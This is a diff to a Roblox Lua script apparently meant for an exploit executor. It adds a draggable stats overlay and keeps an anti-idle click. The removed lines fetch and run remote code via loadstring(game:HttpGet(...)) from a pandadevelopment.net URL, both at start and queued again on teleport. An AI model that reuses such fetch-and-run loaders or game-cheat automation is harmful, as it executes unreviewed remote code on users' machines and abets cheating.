@@ -4,6 +4,7 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local Stats = game:GetService("Stats")
 local VirtualUser = game:GetService("VirtualUser")
+local UIS = game:GetService("UserInputService")
 
 local Player = Players.LocalPlayer
 local PlayerGui = Player:WaitForChild("PlayerGui")
@@ -14,21 +15,7 @@ Player.Idled:Connect(function()
     VirtualUser:ClickButton2(Vector2.new())
 end)
 
--- Auto Execute After Teleport
-local queueteleport = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
-
-Player.OnTeleport:Connect(function(State)
-    if queueteleport then
-        queueteleport('loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/8cffffd967953fe7"))()')
-    end
-end)
-
--- Run Panda Script
-task.spawn(function()
-    loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/8cffffd967953fe7"))()
-end)
-
--- ปิด UI เดิม
+-- ปิด UI อื่น
 task.spawn(function()
     while task.wait(1) do
         for _,v in pairs(PlayerGui:GetChildren()) do
@@ -51,7 +38,49 @@ Frame.BackgroundTransparency = 1
 Frame.Size = UDim2.new(0,600,0,200)
 Frame.Position = UDim2.new(0.5,-300,0,40)
 
--- KyxHub Title
+-- Drag UI
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    Frame.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
+end
+
+Frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = Frame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+Frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+
+UIS.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- Title
 local Title = Instance.new("TextLabel")
 Title.Parent = Frame
 Title.BackgroundTransparency = 1
@@ -102,6 +131,7 @@ Data2.Font = Enum.Font.GothamBold
 Data2.TextScaled = true
 Data2.TextColor3 = Color3.new(1,1,1)
 
+-- Number Format
 local function Comma(n)
     local s = tostring(n)
     while true do
@@ -111,10 +141,7 @@ local function Comma(n)
     return s
 end
 
-local fps = 60
-
-RunService.RenderStepped:Connect(function(dt)
-    fps = math.floor(1/dt)
+RunService.RenderStepped:Connect(function()
 
     local Data = Player:FindFirstChild("Data")
     if Data then
@@ -133,10 +160,6 @@ RunService.RenderStepped:Connect(function(dt)
     end
 
     local Ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
-    local Sea = game.PlaceId
 
-    Data2.Text =
-        "FPS "..fps..
-        " | Ping "..Ping..
-        " | Sea "..Sea
+    Data2.Text = "Ping "..Ping
 end)
